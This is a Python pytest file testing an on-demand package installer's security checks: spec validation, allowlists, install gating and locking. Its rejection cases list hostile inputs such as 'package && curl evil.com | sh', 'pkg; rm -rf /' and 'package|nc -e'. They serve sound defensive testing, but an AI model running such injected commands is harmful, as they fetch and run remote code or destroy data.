"""Tests for tools.lazy_deps — the supply-chain-resilient on-demand installer.

The lazy_deps module is the architectural fix for the "one quarantined
package nukes 10 unrelated extras" problem. It exposes ``ensure(feature)``
which only installs from a strict allowlist, refuses anything that looks
like a URL / file path, runs venv-scoped, and respects the
``security.allow_lazy_installs`` config flag.

These tests cover the security boundary and the public API. The real pip
call is mocked — we never actually shell out during unit tests.
"""

from __future__ import annotations

import os
from pathlib import Path
import subprocess
import sys
import textwrap

import pytest

import tools.lazy_deps as ld


# ---------------------------------------------------------------------------
# Spec safety
# ---------------------------------------------------------------------------


class TestSpecSafety:
    @pytest.mark.parametrize("spec", [
        "mistralai>=2.3.0,<3",
        "elevenlabs>=1.0,<2",
        "honcho-ai>=2.2.0,<3",
        "boto3>=1.35.0,<2",
        "mautrix[encryption]>=0.20,<1",
        "google-api-python-client>=2.100,<3",
        "youtube-transcript-api>=1.2.0",
        "qrcode>=7.0,<8",
        "package",  # bare name, no version
        "package==1.0.0",
        "package~=1.0",
    ])
    def test_safe_specs_pass(self, spec):
        assert ld._spec_is_safe(spec), f"expected {spec!r} to be safe"

    @pytest.mark.parametrize("spec", [
        # URL-shaped → rejected (no remote origin override allowed)
        "git+https://github.com/foo/bar.git",
        "https://example.com/foo.tar.gz",
        # File path → rejected
        "/etc/passwd",
        "./local-malware",
        "../escape",
        # Shell metacharacters → rejected
        "package; rm -rf /",
        "package && curl evil.com | sh",
        "package`whoami`",
        "package$(whoami)",
        "package|nc -e",
        # Pip flag injection → rejected
        "--index-url=http://evil/",
        "-r requirements.txt",
        # Whitespace control chars → rejected
        "package\nshell-injection",
        "package\rmore",
        # Empty / overly long → rejected
        "",
        "x" * 500,
    ])
    def test_unsafe_specs_rejected(self, spec):
        assert not ld._spec_is_safe(spec), \
            f"expected {spec!r} to be rejected"


# ---------------------------------------------------------------------------
# Allowlist enforcement
# ---------------------------------------------------------------------------


class TestAllowlist:
    def test_unknown_feature_raises(self, monkeypatch):
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        with pytest.raises(ld.FeatureUnavailable, match="not in LAZY_DEPS"):
            ld.ensure("not.a.real.feature")


    def test_feature_install_command_unknown(self):
        assert ld.feature_install_command("not.real") is None
        assert ld.feature_install_command("not.real", venv_pip=True) is None

    def test_feature_install_command_venv_pip_targets_interpreter(self):
        # venv_pip=True must target the running interpreter's pip (correct in
        # every install layout, immune to PEP 668) and carry the same specs
        # as the default uv form.
        import sys as _sys
        default = ld.feature_install_command("platform.teams")
        venv = ld.feature_install_command("platform.teams", venv_pip=True)
        assert default is not None and venv is not None
        assert venv.startswith(f"{_sys.executable} -m pip install ")
        assert default.startswith("uv pip install ")
        # Same spec tail on both forms.
        assert venv.split(" -m pip install ", 1)[1] == default.split("uv pip install ", 1)[1]


# ---------------------------------------------------------------------------
# allow_lazy_installs gating
# ---------------------------------------------------------------------------


class TestSecurityGating:
    def test_disabled_via_config_raises(self, monkeypatch):
        # Pretend honcho is missing AND lazy installs are disabled.
        monkeypatch.setitem(ld.LAZY_DEPS, "test.feat", ("packageX>=1.0,<2",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: False)
        with pytest.raises(ld.FeatureUnavailable, match="lazy installs disabled"):
            ld.ensure("test.feat", prompt=False)


    def test_config_failure_fails_open(self, monkeypatch):
        # If config can't be read at all, we ALLOW installs rather than
        # blocking the user out of their own backends.
        monkeypatch.delenv("HERMES_DISABLE_LAZY_INSTALLS", raising=False)
        monkeypatch.setattr(
            "hermes_cli.config.load_config",
            lambda: (_ for _ in ()).throw(RuntimeError("config broken")),
        )
        assert ld._allow_lazy_installs() is True


# ---------------------------------------------------------------------------
# ensure() happy/sad paths
# ---------------------------------------------------------------------------


class TestEnsure:
    def test_durable_lock_lives_outside_wipeable_target(self, monkeypatch, tmp_path):
        target = tmp_path / "lazy-packages"
        monkeypatch.setenv(ld._LAZY_TARGET_ENV, str(target))

        assert ld._lazy_install_lock_path() == (
            tmp_path / ".lazy-packages.lazy-install.lock"
        )
        assert ld._lazy_install_lock_path().parent == target.parent
        assert ld._lazy_install_lock_path().parent != target

    def test_durable_lock_canonicalizes_symlink_alias(self, monkeypatch, tmp_path):
        real_target = tmp_path / "real-target"
        real_target.mkdir()
        alias_target = tmp_path / "alias-target"
        alias_target.symlink_to(real_target, target_is_directory=True)

        monkeypatch.setenv(ld._LAZY_TARGET_ENV, str(real_target))
        real_lock = ld._lazy_install_lock_path()
        monkeypatch.setenv(ld._LAZY_TARGET_ENV, str(alias_target))
        alias_lock = ld._lazy_install_lock_path()

        assert real_target.resolve() == alias_target.resolve()
        assert real_lock == alias_lock

    @pytest.mark.skipif(
        not hasattr(os, "fork") or ld.fcntl is None,
        reason="requires POSIX fork and flock",
    )
    def test_fork_child_closes_inherited_lock_descriptor(self, tmp_path):
        """A child must release the lock description inherited from its parent."""
        result = tmp_path / "child-result"
        worker = tmp_path / "fork-worker.py"
        worker.write_text(
            textwrap.dedent(
                """
                import os
                from pathlib import Path
                import signal
                import time

                import tools.lazy_deps as ld

                result = Path(os.environ["FORK_RESULT"])
                holder = os.fork()
                if holder == 0:
                    with ld._lazy_install_lock():
                        read_fd, write_fd = os.pipe()
                        child = os.fork()
                        if child == 0:
                            os.close(write_fd)
                            # Wait for the lock-holding parent to exit abruptly.
                            os.read(read_fd, 1)
                            os.close(read_fd)
                            signal.alarm(2)
                            with ld._lazy_install_lock():
                                result.write_text("acquired", encoding="utf-8")
                            os._exit(0)
                        os.close(read_fd)
                        os.close(write_fd)
                        os._exit(0)

                os.waitpid(holder, 0)
                deadline = time.monotonic() + 4
                while not result.exists() and time.monotonic() < deadline:
                    time.sleep(0.02)
                raise SystemExit(0 if result.exists() else 1)
                """
            ),
            encoding="utf-8",
        )
        env = os.environ.copy()
        env.update(
            {
                "FORK_RESULT": str(result),
                "HERMES_LAZY_INSTALL_TARGET": str(tmp_path / "lazy-target"),
                "PYTHONPATH": str(Path(__file__).resolve().parents[2]),
            }
        )

        completed = subprocess.run(
            [sys.executable, str(worker)],
            env=env,
            capture_output=True,
            text=True,
            timeout=8,
        )

        assert completed.returncode == 0, completed.stderr
        assert result.read_text(encoding="utf-8") == "acquired"

    def test_already_satisfied_is_noop(self, monkeypatch):
        # If the package is importable, ensure() returns without calling pip.
        monkeypatch.setitem(ld.LAZY_DEPS, "test.satisfied", ("zzzfake>=1",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: True)
        # If pip were called, this would fail loudly.
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called"),
        )
        ld.ensure("test.satisfied", prompt=False)  # no exception


    def test_install_succeeds_but_still_missing_raises(self, monkeypatch):
        # Pip says success but the package still isn't importable
        # (e.g. site-packages caching, wrong python). Surface this.
        monkeypatch.setitem(ld.LAZY_DEPS, "test.cache", ("zzzfake>=1",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda specs, **kw: ld._InstallResult(True, "ok", ""),
        )
        with pytest.raises(ld.FeatureUnavailable, match="still not importable"):
            ld.ensure("test.cache", prompt=False)

    def test_concurrent_processes_install_same_feature_once(self, tmp_path):
        """Two first-use processes must serialize and recheck under the lock.

        Both children deliberately finish their initial ``feature_missing``
        check before either can install. Without a cross-process critical
        section they both enter the installer and mutate the same durable
        target; with the lock, the second child observes the marker written by
        the first and returns without a duplicate install.
        """
        target = tmp_path / "lazy-target"
        ready = tmp_path / "ready"
        install_count = tmp_path / "install-count"
        installed = tmp_path / "installed"
        worker = tmp_path / "worker.py"
        worker.write_text(
            textwrap.dedent(
                """
                import os
                from pathlib import Path
                import time

                import tools.lazy_deps as ld

                ready = Path(os.environ["RACE_READY"])
                install_count = Path(os.environ["RACE_INSTALL_COUNT"])
                installed = Path(os.environ["RACE_INSTALLED"])
                checks = 0

                ld.LAZY_DEPS["test.concurrent"] = ("race-package==1.0",)
                ld._allow_lazy_installs = lambda: True
                ld._unsupported_feature_reason = lambda _feature: None

                def is_satisfied(_spec):
                    global checks
                    checks += 1
                    if checks == 1:
                        ready.parent.mkdir(parents=True, exist_ok=True)
                        with ready.open("a", encoding="utf-8") as handle:
                            handle.write(f"{os.getpid()}\\n")
                            handle.flush()
                            os.fsync(handle.fileno())
                        deadline = time.monotonic() + 10
                        while len(ready.read_text(encoding="utf-8").splitlines()) < 2:
                            if time.monotonic() >= deadline:
                                raise RuntimeError("peer process did not reach pre-lock check")
                            time.sleep(0.01)
                        return False
                    return installed.exists()

                def install(_specs, **_kwargs):
                    with install_count.open("a", encoding="utf-8") as handle:
                        handle.write(f"{os.getpid()}\\n")
                        handle.flush()
                        os.fsync(handle.fileno())
                    time.sleep(0.2)
                    installed.write_text("ok", encoding="utf-8")
                    return ld._InstallResult(True, "ok", "")

                ld._is_satisfied = is_satisfied
                ld._venv_pip_install = install
                ld.ensure("test.concurrent", prompt=False)
                """
            ),
            encoding="utf-8",
        )

        env = os.environ.copy()
        env.update(
            {
                "HERMES_LAZY_INSTALL_TARGET": str(target),
                "PYTHONPATH": str(Path(__file__).resolve().parents[2]),
                "RACE_READY": str(ready),
                "RACE_INSTALL_COUNT": str(install_count),
                "RACE_INSTALLED": str(installed),
            }
        )
        children = [
            subprocess.Popen(
                [sys.executable, str(worker)],
                env=env,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
            )
            for _ in range(2)
        ]
        results = [child.communicate(timeout=20) for child in children]

        assert [child.returncode for child in children] == [0, 0], results
        assert len(install_count.read_text(encoding="utf-8").splitlines()) == 1


# ---------------------------------------------------------------------------
# is_available
# ---------------------------------------------------------------------------


class TestIsAvailable:
    def test_unknown_feature_returns_false(self):
        assert ld.is_available("not.a.thing") is False


    def test_missing_returns_false(self, monkeypatch):
        monkeypatch.setitem(ld.LAZY_DEPS, "test.miss", ("zzzfake>=1",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        assert ld.is_available("test.miss") is False


# ---------------------------------------------------------------------------
# Version-aware _is_satisfied (Piece B — "stale pin" detection)
#
# The original implementation returned True the moment the package name
# was importable, ignoring the spec's version range. That meant pin bumps
# in LAZY_DEPS never propagated to users who already lazy-installed the
# backend at an older version. _is_satisfied now parses the spec and
# checks the installed version against the constraint.
# ---------------------------------------------------------------------------


class TestIsSatisfiedVersionAware:
    def _fake_version(self, monkeypatch, installed_versions: dict):
        """Patch importlib.metadata.version() inside lazy_deps."""
        from importlib.metadata import PackageNotFoundError

        def _version(pkg):
            if pkg in installed_versions:
                return installed_versions[pkg]
            raise PackageNotFoundError(pkg)

        # Patch at the import site lazy_deps uses (inside the function).
        import importlib.metadata as _md
        monkeypatch.setattr(_md, "version", _version)

    def test_exact_pin_match_returns_true(self, monkeypatch):
        self._fake_version(monkeypatch, {"honcho-ai": "2.2.0"})
        assert ld._is_satisfied("honcho-ai==2.2.0") is True


    def test_range_within_returns_true(self, monkeypatch):
        self._fake_version(monkeypatch, {"slack-bolt": "1.27.0"})
        assert ld._is_satisfied("slack-bolt>=1.18.0,<2") is True


    def test_bare_package_name_presence_is_enough(self, monkeypatch):
        # No version constraint — presence alone counts as satisfied.
        self._fake_version(monkeypatch, {"somepkg": "1.0.0"})
        assert ld._is_satisfied("somepkg") is True

    def test_extras_block_in_spec_is_stripped(self, monkeypatch):
        # mautrix[encryption]==0.21.0 — the [encryption] block must not
        # confuse the specifier parser.
        self._fake_version(monkeypatch, {"mautrix": "0.21.0"})
        assert ld._is_satisfied("mautrix[encryption]==0.21.0") is True

    def test_extras_block_mismatch_returns_false(self, monkeypatch):
        self._fake_version(monkeypatch, {"mautrix": "0.20.0"})
        assert ld._is_satisfied("mautrix[encryption]==0.21.0") is False

    def test_trace_upload_hub_at_core_locked_version_is_current(self, monkeypatch):
        """#60783 regression: refresh must not churn the shared hub install.

        huggingface-hub arrives in the venv via the core lock (transformers /
        sentence-transformers for local Hindsight, faster-whisper, tokenizers).
        With the LAZY_DEPS pin held in lockstep with uv.lock, the version the
        core installs satisfies the trace-upload spec, so the `hermes update`
        lazy-refresh pass reports "current" instead of reinstalling — the
        downgrade that used to break the Hindsight daemon can't happen.
        """
        spec = ld.LAZY_DEPS["tool.trace_upload"][0]
        pinned = ld._specifier_from_spec(spec).lstrip("=")
        self._fake_version(monkeypatch, {"huggingface-hub": pinned})
        assert ld._is_satisfied(spec) is True
        assert ld.feature_missing("tool.trace_upload") == ()

    @pytest.mark.parametrize(
        ("feature", "installed_versions", "expected_repairs"),
        [
            (
                "skill.google_workspace",
                {
                    "google-api-python-client": "2.194.0",
                    "google-auth": "2.55.0",
                    "google-auth-oauthlib": "1.3.1",
                    "google-auth-httplib2": "0.3.1",
                    "httplib2": "0.31.2",
                    "pyasn1": "0.6.3",
                },
                (
                    "google-auth==2.55.1",
                    "httplib2==0.32.0",
                    "pyasn1==0.6.4",
                ),
            ),
            (
                "provider.vertex",
                {
                    "google-auth": "2.55.1",
                    "pyasn1": "0.6.3",
                },
                ("pyasn1==0.6.4",),
            ),
        ],
    )
    def test_google_features_repair_stale_transitives(
        self,
        monkeypatch,
        feature,
        installed_versions,
        expected_repairs,
    ):
        self._fake_version(monkeypatch, installed_versions)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        installed = []

        def fake_install(specs, **kwargs):
            installed.extend(specs)
            for spec in specs:
                package, wanted = spec.split("==", 1)
                installed_versions[package] = wanted
            return ld._InstallResult(True, "ok", "")

        monkeypatch.setattr(ld, "_venv_pip_install", fake_install)

        ld.ensure(feature, prompt=False)

        assert tuple(installed) == expected_repairs


# ---------------------------------------------------------------------------
# active_features + refresh_active_features (Piece A — hermes update wiring)
# ---------------------------------------------------------------------------


class TestActiveFeatures:
    def test_no_packages_installed_returns_empty(self, monkeypatch):
        monkeypatch.setattr(ld, "_is_present", lambda spec: False)
        assert ld.active_features() == []


    def test_shared_dependency_does_not_activate_feature(self, monkeypatch):
        # asyncpg is a generic dependency that may be installed for unrelated
        # reasons. It must not make hermes update try to refresh Matrix unless
        # the Matrix anchor package (mautrix) is present.
        monkeypatch.setattr(
            ld, "_is_present",
            lambda spec: ld._pkg_name_from_spec(spec) == "asyncpg",
        )
        assert "platform.matrix" not in ld.active_features()


class TestRefreshActiveFeatures:
    def test_no_active_features_returns_empty(self, monkeypatch):
        monkeypatch.setattr(ld, "active_features", lambda: [])
        assert ld.refresh_active_features() == {}

    def test_windows_matrix_refresh_is_skipped_before_pip(self, monkeypatch):
        # Matrix E2EE pulls python-olm, which has no native Windows wheel/build
        # path. `hermes update` must not retry that doomed install every run.
        #
        # The subject here is the *consumer* — refresh_active_features honouring
        # the gate before pip — so we monkeypatch lazy_deps' own platform probe
        # instead of faking the host, which keeps this covered on Linux too.
        monkeypatch.setattr(
            ld,
            "_unsupported_feature_reason",
            lambda feature: (
                "unsupported on Windows: Matrix E2EE depends on python-olm"
                if feature == "platform.matrix"
                else None
            ),
        )
        monkeypatch.setattr(ld, "active_features", lambda: ["platform.matrix"])
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld,
            "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called for unsupported Matrix on Windows"),
        )

        result = ld.refresh_active_features()

        assert result["platform.matrix"].startswith("skipped:")
        assert "unsupported on Windows" in result["platform.matrix"]

    @pytest.mark.windows_only
    def test_matrix_probe_reports_unsupported_on_real_windows(self):
        # The probe itself keys off the real host: patching sys.platform only
        # proved the string, never that Windows actually hits this gate.
        assert "unsupported on Windows" in (
            ld._unsupported_feature_reason("platform.matrix") or ""
        )

    def test_restore_snapshot_skips_telegram_with_lazy_installs_disabled(
        self, monkeypatch
    ):
        """The security opt-out also blocks updater-driven restoration."""
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: False)
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(
            ld,
            "_venv_pip_install",
            lambda *args, **kwargs: pytest.fail(
                "pip must not run when lazy installs are disabled"
            ),
        )

        result = ld.restore_features(["platform.telegram"])

        assert result == {
            "platform.telegram": (
                "skipped: lazy installs disabled "
                "(security.allow_lazy_installs=false)"
            )
        }

    def test_restore_snapshot_does_not_install_never_activated_features(
        self, monkeypatch
    ):
        monkeypatch.setattr(
            ld,
            "_venv_pip_install",
            lambda *args, **kwargs: pytest.fail(
                "cold features must stay uninstalled"
            ),
        )

        assert ld.restore_features([]) == {}

    def test_mixed_results_returns_per_feature_status(self, monkeypatch):
        monkeypatch.setattr(ld, "active_features", lambda: ["a.ok", "b.fail"])
        monkeypatch.setitem(ld.LAZY_DEPS, "a.ok", ("pkga==1.0",))
        monkeypatch.setitem(ld.LAZY_DEPS, "b.fail", ("pkgb==1.0",))
        # a.ok: already satisfied → "current"
        # b.fail: missing + install fails → "failed:"
        def fake_satisfied(spec):
            return ld._pkg_name_from_spec(spec) == "pkga"
        monkeypatch.setattr(ld, "_is_satisfied", fake_satisfied)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda specs, **kw: ld._InstallResult(False, "", "nope"),
        )
        result = ld.refresh_active_features()
        assert result["a.ok"] == "current"
        assert result["b.fail"].startswith("failed:")


# ---------------------------------------------------------------------------
# install_specs — manifest-driven installs (dashboard memory providers etc.)
#
# NS-605: the dashboard's memory-provider setup endpoint used to shell out
# to `uv pip install --python sys.executable`, which fails with a permission
# error on the sealed hosted venv. install_specs routes those installs
# through the same environment-aware pipeline as ensure(): venv-scoped on
# normal installs, redirected to the durable target on immutable images,
# and cleanly refused (with a reason) when installs are gated off.
# ---------------------------------------------------------------------------


class TestInstallSpecs:
    def test_empty_specs_is_trivially_ok(self, monkeypatch):
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called"),
        )
        result = ld.install_specs([])
        assert result.ok is True
        assert result.blocked is False

    def test_blank_specs_are_ignored(self, monkeypatch):
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called"),
        )
        result = ld.install_specs(["", "   "])
        assert result.ok is True

    @pytest.mark.parametrize("bad", [
        "pkg; rm -rf /",
        "-e git+https://evil.example/repo.git",
        "https://evil.example/pkg.tar.gz",
        "../../etc/passwd",
        "pkg @ file:///tmp/x",
    ])
    def test_unsafe_specs_are_blocked_before_any_install(self, monkeypatch, bad):
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called"),
        )
        result = ld.install_specs([bad])
        assert result.ok is False
        assert result.blocked is True
        assert "unsafe spec" in result.reason

    def test_one_unsafe_spec_blocks_the_whole_batch(self, monkeypatch):
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called"),
        )
        result = ld.install_specs(["honcho-ai==2.2.0", "pkg; rm -rf /"])
        assert result.blocked is True


    def test_never_raises_on_unexpected_error(self, monkeypatch):
        monkeypatch.delenv("HERMES_DISABLE_LAZY_INSTALLS", raising=False)
        monkeypatch.delenv(ld._LAZY_TARGET_ENV, raising=False)
        monkeypatch.setattr(
            "hermes_cli.config.load_config", lambda: {}, raising=False
        )
        # Contract: install_specs never raises — even an unexpected installer
        # crash comes back as a failed result the caller can render.
        def boom(specs, **kw):
            raise RuntimeError("disk on fire")
        monkeypatch.setattr(ld, "_venv_pip_install", boom)
        result = ld.install_specs(["honcho-ai==2.2.0"])
        assert result.ok is False
        assert "disk on fire" in result.stderr
